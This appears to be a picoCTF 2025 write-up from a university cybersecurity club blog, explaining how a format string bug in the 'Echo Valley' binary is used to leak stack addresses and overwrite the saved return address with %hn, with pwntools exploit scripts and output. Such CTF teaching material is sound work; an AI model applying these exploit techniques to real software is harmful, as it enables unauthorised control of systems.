<!doctype html><html lang=en><head><script>MathJax={tex:{inlineMath:[['$','$'],['\\(','\\)']],displayMath:[['$$','$$'],["\\[","\\]"]],processEscapes:true,processEnvironments:true}}</script><script async id=MathJax-script src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="text/html; charset=UTF-8" http-equiv=content-type><meta content="width=device-width,initial-scale=1,user-scalable=no" name=viewport><meta content="index, follow" name=robots><title>Echo Valley</title><meta content="Echo Valley" name=title><meta content=exploiitm name=author><meta content="Official blog of Cybersecurity Club, IIT Madras" name=description><meta content=website property=og:type><meta content=https://exploiitm.github.io/blog/writeups/picoCTF2025/echo/ property=og:url><meta content="exploiitm blog" property=og:site_name><meta content="Echo Valley" property=og:title><meta content="Official blog of Cybersecurity Club, IIT Madras" property=og:description><meta content=https://exploiitm.github.io/blog/favicon.ico property=og:image><meta content=summary_large_image property=twitter:card><meta content=https://exploiitm.github.io/blog/writeups/picoCTF2025/echo/ property=twitter:url><meta content="Echo Valley" property=twitter:title><meta content="Official blog of Cybersecurity Club, IIT Madras" property=twitter:description><meta content=https://exploiitm.github.io/blog/favicon.ico property=twitter:image><link href=https://exploiitm.github.io/blog/writeups/picoCTF2025/echo/ rel=canonical><link rel="shortcut icon" href=https://exploiitm.github.io/blog/favicon.ico type=image/x-icon><link href=https://speyll.github.io/suCSS/reset-min.css rel=stylesheet><link href=https://speyll.github.io/suCSS/suCSS-min.css rel=stylesheet><link href=https://exploiitm.github.io/blog/css/style.css rel=stylesheet><script defer src=https://exploiitm.github.io/blog/js/script.js></script><body><header><nav id=nav-bar><a href=https://exploiitm.github.io/> home </a><a href=/blog> blog </a><a href=/blog/writeups> writeups </a><a href=/blog/about> about </a><a href=/blog/contacts> contact </a><div><input id=theme-toggle style=display:none type=checkbox><label for=theme-toggle id=theme-toggle-label><svg class=icons id=theme-icon><use href=https://exploiitm.github.io/blog/icons.svg#lightMode></use></svg></label><audio id=theme-sound><source src=https://exploiitm.github.io/blog/click.ogg type=audio/ogg></audio></div></nav></header><main><div><a href=..>..</a>/<span class=accent-data>echo</span></div><time datetime=2025-04-10>Published on: <span class=accent-data>2025-04-10</span></time><address rel=author>By <span class=accent-data> rishit khandelwal, and exploiitm </span></address><h1>Echo Valley</h1><h1 id=picoctf>picoCTF</h1><p>So when we first run <code>./valley</code>, we can observe that it asks us for some input as <code>Welcome to the Echo Valley, Try Shouting: \n</code>.<p>Looking into the code we can see that, <code>main()</code> simply calls <code>echo_valley</code>. Looking into the code for <code>echo_valley</code> we see that its reads 100 bytes into a buffer of 100 bytes using <code>fgets</code>. This essentially means that there is probably no buffer overflow in this case.<p>Looking down further we see:<pre class=language-c data-lang=c style=background:#282828;color:#fdf4c1aa><code class=language-c data-lang=c><span style=color:#fdf4c1>printf(</span><span style=color:#b8bb26>"You heard in the distance: "</span><span style=color:#fdf4c1>)</span><span>;
</span><span style=color:#fdf4c1>printf(buf)</span><span>;
</span></code></pre><p>This is obviously a format string vulnerability, and so we have arbitrary read/writes. To win this challenge, we simply need to overwrite the stored rip on the stack such that when we enter “exit” we return to <code>print_flag</code> instead of <code>main</code>.<p>We can see by running <code>checksec</code> on the binary, that PIE is enabled so we cant just get the address of the function, but thats no problem, since we can just leak any other address from the stack which we know points to some known location, we can calculate the address of <code>print_flag</code>. Going into <code>gdb</code>, we run the program and examine the stack to find the old rip on the stack. If we leak the address using the format string vulnerability instead (lets just write a script to do that)<pre class=language-py data-lang=py style=background:#282828;color:#fdf4c1aa><code class=language-py data-lang=py><span>
</span><span style=color:#fa5c4b>from </span><span>pwn </span><span style=color:#fa5c4b>import </span><span style=color:#d3869b>*
</span><span>
</span><span style=color:#fdf4c1>context.clear(arch </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>'amd64'</span><span style=color:#fdf4c1>)
</span><span>p </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>process(</span><span style=color:#b8bb26>"./valley"</span><span style=color:#fdf4c1>)
</span><span>
</span><span style=color:#fdf4c1>p.recv()
</span><span style=color:#fdf4c1>p.sendline(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"</span><span style=color:#fdf4c1>%p </span><span style=color:#b8bb26>"</span><span style=color:#fe8019>*</span><span style=color:#d3869b>30</span><span style=color:#fdf4c1>)
</span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(p.recv().decode())
</span></code></pre><p>If we run this script a couple of times we notice that some the addresses seem to not change for the last few digits. In my case the addresses which start with 0x7ffc— seem to remain roughly the same in the last few digits.<pre style=background:#282828;color:#fdf4c1aa><code><span>0x7ffc292cc540 (nil) (nil) 0x561fa1a3670b 0x1 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0xa2070 (nil) 0xe227b993d1d31a00 0x7ffc292cc770 0x561f8ed4f413 0x7ffc292cc810 0x7f26175c9248 0x7ffc292cc7c0 0x7ffc292cc898 0x18ed4e040 0x561f8ed4f401 0x7ffc292cc898 0xf570526974ed44af 0x1
</span></code></pre><p>Doing this in gdb we can notice that the 21st seems to be the return address and the 20th one points to 8 bytes ahead of the return address.<p>So first we receive the address at the 20th position, then we subtract 8 to get the address at which we have to write the winning address.<p>We get the address at the 21st and then offset it by some value to get the address for <code>print_flag</code>. By running <code>objdump -D valley</code> we can find the offsets of <code>main</code> and <code>print_flag</code>. <code>main</code> is at 0x1401 <code>print_flag</code> is at 0x1269 but the address we get from the leak isnt exactly at <code>main</code>, so we go into gdb and find out the offset for from the address we got from the 21st address to main which turns out to be 0x1aa.<p>So we subtract 0x1aa from to get the address we want to overwrite.<p>So now we have both the value we want to overwrite and where we want to overwrite. The way we can write is by using the <code>%n</code> format specifier. Basically, <code>printf("AAAA%n", 0xdeadbeef);</code> will write 4 (from AAAA being printed being 4 bytes) to 0xdeadbeef.<p>Now you might wonder, we cant pass any arguments to <code>printf</code>, how do we write to any arbitrary address we want. Well we simply add the address as bytes into our payload. How does that help? Well you might have noticed above that there are a lot of repeating x2070252070252070 in the above, what does that mean? It means that our input is also accessible as arguments to <code>printf</code>! We can just point to the address we added as bytes into our input.<p>But we need to write an entire 64 bit address into at some address, and we dont really have that many bytes to spare (only a 100). So there are two solutions to this problem.<ol><li>We use the padding feature for format specifier to make the string many times longer than it wouldve been otherwise.<li>Instead of overwriting the entire address and the gazzilions of bytes it would take, we just overwrite the last 2 bytes since only it remains the same (atleast the last 3 nibbles).</ol><p>We can overwrite just the last 2 bytes by using <code>%hn</code> instead of using <code>%n</code> whose effect is essentially the same except that it writes just 2 bytes.<p>So our exploit script looks like:<pre class=language-py data-lang=py style=background:#282828;color:#fdf4c1aa><code class=language-py data-lang=py><span style=color:#fdf4c1>p.sendline(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"%20$p"</span><span style=color:#fdf4c1>)
</span><span>addr </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>p.recvuntil(</span><span style=color:#b8bb26>'\n'</span><span style=color:#fdf4c1>)</span><span>[</span><span style=color:#d3869b>29</span><span>:</span><span style=color:#fe8019>-</span><span style=color:#d3869b>1</span><span>]</span><span style=color:#fdf4c1>.decode()
</span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(addr)
</span><span>addr </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>int</span><span style=color:#fdf4c1>(addr, base</span><span style=color:#fe8019>=</span><span style=color:#d3869b>16</span><span style=color:#fdf4c1>)
</span><span>addr </span><span style=color:#fe8019>-= </span><span style=color:#d3869b>8
</span><span style=font-style:italic;color:#928374># now addr points to the old rip
</span><span style=color:#fdf4c1>p.sendline(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"%21$p"</span><span style=color:#fdf4c1>)
</span><span>win_addr </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>p.recvuntil(</span><span style=color:#b8bb26>'\n'</span><span style=color:#fdf4c1>)</span><span>[</span><span style=color:#d3869b>29</span><span>:</span><span style=color:#fe8019>-</span><span style=color:#d3869b>1</span><span>]</span><span style=color:#fdf4c1>.decode()
</span><span>win_addr </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>int</span><span style=color:#fdf4c1>(win_addr, base</span><span style=color:#fe8019>=</span><span style=color:#d3869b>16</span><span style=color:#fdf4c1>)
</span><span>win_addr </span><span style=color:#fe8019>-= </span><span style=color:#d3869b>0x1aa
</span><span>
</span><span>win_addr_low </span><span style=color:#fe8019>= </span><span>win_addr </span><span style=color:#fe8019>& </span><span style=color:#d3869b>0xffff
</span><span style=font-style:italic;color:#928374># Since we only need to overwrite the last 2 bytes
</span></code></pre><p>Now the payload:<pre class=language-py data-lang=py style=background:#282828;color:#fdf4c1aa><code class=language-py data-lang=py><span>payload </span><span style=color:#fe8019>= </span><span style=color:#fa5c4b>f</span><span style=color:#b8bb26>"%</span><span>{</span><span style=color:#fdf4c1>win_addr_low</span><span>}</span><span style=color:#b8bb26>x%8$hn"</span><span style=color:#fdf4c1>.encode(</span><span style=color:#b8bb26>'utf-8'</span><span style=color:#fdf4c1>)</span><span style=color:#fe8019>+</span><span style=color:#fdf4c1>p64(addr)
</span><span style=font-style:italic;color:#928374># Foreshadowing
</span><span style=color:#fdf4c1>p.sendline(payload)
</span><span style=color:#fdf4c1>p.sendline(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"exit"</span><span style=color:#fdf4c1>)
</span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(p.recv())
</span></code></pre><p>But this obviously doesnt work! We dont know where the address actually is do we? So we simply enter into gdb, and enter the payload, and try to figure out the argument the address aligns with. By trial and error we see that by adding some spaces we can manage to have the address be exactly at the position of the 8th argument.<pre class=language-py data-lang=py style=background:#282828;color:#fdf4c1aa><code class=language-py data-lang=py><span>x </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>len</span><span style=color:#fdf4c1>(</span><span style=color:#fabd2f>str</span><span style=color:#fdf4c1>(win_addr_low)) </span><span style=font-style:italic;color:#928374># the length of the address in decimal
</span><span>payload </span><span style=color:#fe8019>= </span><span style=color:#fa5c4b>f</span><span style=color:#b8bb26>"%</span><span>{</span><span style=color:#fdf4c1>win_addr_low</span><span style=color:#fe8019>-</span><span style=color:#d3869b>6</span><span>}</span><span style=color:#b8bb26>x</span><span>{</span><span style=color:#fdf4c1>(</span><span style=color:#d3869b>9</span><span style=color:#fe8019>-</span><span style=color:#fdf4c1>x)</span><span style=color:#fe8019>*</span><span style=color:#b8bb26>' '</span><span>}</span><span style=color:#b8bb26>"</span><span style=color:#fdf4c1>.encode(</span><span style=color:#b8bb26>"utf-8"</span><span style=color:#fdf4c1>)
</span><span>payload </span><span style=color:#fe8019>+= </span><span style=color:#fa5c4b>f</span><span style=color:#b8bb26>"%8$hn"</span><span style=color:#fdf4c1>.encode(</span><span style=color:#b8bb26>'utf-8'</span><span style=color:#fdf4c1>)
</span><span>payload </span><span style=color:#fe8019>+= </span><span style=color:#fdf4c1>p64(addr)
</span><span>
</span><span style=color:#fdf4c1>p.sendline(payload)
</span><span style=color:#fdf4c1>p.sendline(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"exit"</span><span style=color:#fdf4c1>)
</span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(p.recv())
</span></code></pre><p>The first change is that we subtract 6 from <code>win_addr_low</code>, as we are adding spaces to actually pad the address, we lessen the “apparent padding” to make sure the value remains the same. Next depending upon the length of the decimal representation of <code>win_addr_low</code>, we may need to write 3 or 4 bytes so we add <code>9-x</code> spaces.<p>Now we simply need to run the full script and it should give us the flag! But the script fails! Now why could that be, the logic seems flawless and there are no issues with the script either. By strategically adding <code>print</code>s throughout the script i discovered this only seems to work if the 1st of the 4 nibbles im writing is 0 (i have no idea why). By running the script a couple of times it worked once, and i knew it ran <code>print_flag</code>.<pre class=language-txt data-lang=txt style=background:#282828;color:#fdf4c1aa><code class=language-txt data-lang=txt><span>b'The Valley Disappears\nFailed to open flag file: No such file or directory\n'
</span><span>[*] Process './valley' stopped with exit code 1 (pid 14436)
</span></code></pre><p class=tags-data></main><footer><hr><div class=footContainer><div class=footLeft><p>Licensed under <a rel="noopener noreferrer" href=https://fr.wikipedia.org/wiki/Licence_MIT target=_blank>MIT</a><br></div><div class=footRight><img class="footGif noStyle" alt=footGif loading=lazy src=https://i.ibb.co/XYDpfcs/foot.gif><a rel="noopener noreferrer" title="Subscribe via RSS for updates." class=metaData href=https://exploiitm.github.io/blog/atom.xml target=_blank>RSS</a></div></div></footer>